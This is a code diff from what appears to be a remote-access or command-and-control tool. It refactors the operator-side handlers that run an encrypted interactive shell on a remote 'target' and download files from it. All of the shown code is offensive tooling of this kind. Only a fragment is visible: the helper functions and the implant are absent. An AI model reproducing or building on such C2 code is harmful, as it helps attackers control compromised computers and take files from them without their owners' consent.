@@ -1,8 +1,15 @@
+import components.networking as networking
+from ..oberon_framework import clear_screen
+from components.ingestor import createfile_nocollision
+import time
+import os
+import ascii_art
+
 def process_shell_prompt(output, conn_obj):
-    clear_socket_buffer(conn_obj)
+    networking.clear_socket_buffer(conn_obj)
     try:
         # Decrypt the message and decode it
-        decrypted_message = decrypt_message(output).decode()
+        decrypted_message = networking.decrypt_message(output).decode()
         shell_prompt, message = '', ''
         
         # Strip the "::" delimiter to separate message and prompt
@@ -36,7 +43,7 @@ def shell_command(client_output, conn_obj):
     usr_input, shell_prompt = '', process_shell_prompt(client_output, conn_obj)
     
     while True:
-        clear_socket_buffer(conn_obj)
+        networking.clear_socket_buffer(conn_obj)
         usr_input = input("\n" + colored(shell_prompt, attrs=["bold"])).strip()
         
         if usr_input == "clear" or usr_input == "cls":
@@ -44,7 +51,7 @@ def shell_command(client_output, conn_obj):
             shell_banner()
             continue
         elif usr_input == "quit" or usr_input == "exit":
-            clear_socket_buffer(conn_obj) 
+            networking.clear_socket_buffer(conn_obj) 
             print("Redirecting you back to th3executor . . .")
             time.sleep(1.5)
             clear_screen()
@@ -56,7 +63,7 @@ def shell_command(client_output, conn_obj):
             shell_cheat_sheet()
             continue
         
-        conn_obj.sendall(encrypt_message(usr_input))  # Send command
+        conn_obj.sendall(networking.encrypt_message(usr_input))  # Send command
         if usr_input == "quit" or usr_input == "exit":
             break
         
@@ -80,7 +87,7 @@ def shell_command(client_output, conn_obj):
         retry_counter = 0
         while retry_counter != 2:
             try:
-                output = decrypt_message(conn_obj.recv(4096)).decode()
+                output = networking.decrypt_message(conn_obj.recv(4096)).decode()
                 output = output.replace("[NEWLINE]", "\n")
                 break
             except:
@@ -96,21 +103,21 @@ def download(conn_obj, usr_input):
         return "[-] Incorrect command usage. Specify 'download' followed by the file path"
         
     # Send the command to the client
-    conn_obj.sendall(encrypt_message(usr_input))
+    conn_obj.sendall(networking.encrypt_message(usr_input))
     
     try:
-        data_size = int(decrypt_message(conn_obj.recv(1024)).decode().strip())
+        data_size = int(networking.decrypt_message(conn_obj.recv(1024)).decode().strip())
         if not data_size:
             return "[-] No data has been recieved from target."
         
-        file_data = reliable_recieve(conn_obj, data_size)
+        file_data = networking.reliable_recieve(conn_obj, data_size)
         if not file_data:
             return "[-] No file data has been recieved from target."
                             
         if isinstance(data_size, str):
             return f"[-] An error occured when trying to get the file size. {file_data}"
         else:              
-            file_data = process_and_check_recieved_data(file_data, data_size)
+            file_data = networking.process_and_check_recieved_data(file_data, data_size)
             if isinstance(file_data, str):
                 return f"[-] An error occured when trying to get the file data. {file_data}"          
     except Exception as err:
